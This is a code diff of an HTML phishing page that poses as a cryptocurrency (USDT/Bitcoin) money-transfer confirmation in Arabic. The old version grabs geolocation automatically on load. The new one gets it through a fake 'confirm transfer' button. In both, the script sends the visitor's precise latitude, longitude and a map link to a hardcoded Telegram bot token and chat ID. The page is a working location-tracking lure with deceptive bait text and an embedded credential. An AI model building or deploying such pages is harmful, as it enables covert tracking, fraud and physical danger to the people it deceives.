@@ -2,75 +2,93 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>USDT Transaction</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>عملات رقمية USDT وبيتكوين</title>
   <style>
     body {
-      margin: 0;
-      background-color: #000;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      background-color: #181818;
       color: white;
-      font-family: Arial, sans-serif;
+      font-family: sans-serif;
+      text-align: center;
+      padding: 20px;
     }
-    video {
-      width: 90%;
-      border-radius: 12px;
-      border: 2px solid gold;
+    .group-box {
+      background-color: #222;
+      border-radius: 15px;
+      padding: 20px;
+      box-shadow: 0 0 20px gold;
+      max-width: 400px;
+      margin: auto;
     }
-    .msg {
-      margin-top: 10px;
-      font-size: 16px;
+    .group-img {
+      width: 100px;
+      margin-bottom: 10px;
+    }
+    .group-name {
+      font-size: 1.4em;
+      font-weight: bold;
       color: gold;
+    }
+    .message {
+      background-color: #333;
+      padding: 15px;
+      margin-top: 15px;
+      border-radius: 10px;
+      color: #ddd;
+    }
+    .button {
+      background-color: #FFD700;
+      color: #000;
+      border: none;
+      padding: 12px 20px;
+      font-size: 1em;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <video id="vid" autoplay muted playsinline>
-    <source src="usdt.mp4" type="video/mp4">
-    Your browser does not support HTML5 video.
-  </video>
-  <div class="msg">Checking location...</div>
+  <div class="group-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" class="group-img" alt="Bitcoin Logo">
+    <div class="group-name">عملات رقمية USDT وبيتكوين</div>
+    <div class="message">
+      تهانينا! لقد تم قبول الطلب لتحويل المال<br>
+      الرجاء الضغط على الزر أدناه لتأكيد العملية.
+    </div>
+    <button class="button" onclick="getLocation()">تأكيد تحويل المال</button>
+  </div>
 
   <script>
-    function sendLocation(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
-      const chat_id = "7485197107";
-      const msg = `📍 Location Received:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
-
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chat_id,
-          text: msg
-        })
-      });
-    }
-
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, function(error) {
-          console.log("Location permission denied or failed");
-        }, {
+        navigator.geolocation.getCurrentPosition(success, error, {
           enableHighAccuracy: true,
-          timeout: 5000,
-          maximumAge: 0
+          timeout: 10000
         });
       }
     }
 
-    // تشغيل طلب الموقع بعد ثانية من بدء الصفحة
-    window.onload = function () {
-      setTimeout(getLocation, 1000);
-    };
+    function success(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; // توكن البوت
+      const chat_id = "7485197107"; // معرف الشات
+      const message = `📍 موقع جديد:\nLatitude: ${latitude}\nLongitude: ${longitude}\nhttps://maps.google.com/?q=${latitude},${longitude}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      });
+    }
+
+    function error(err) {
+      console.warn("لم يتم تحديد الموقع:", err);
+    }
   </script>
 </body>
 </html>
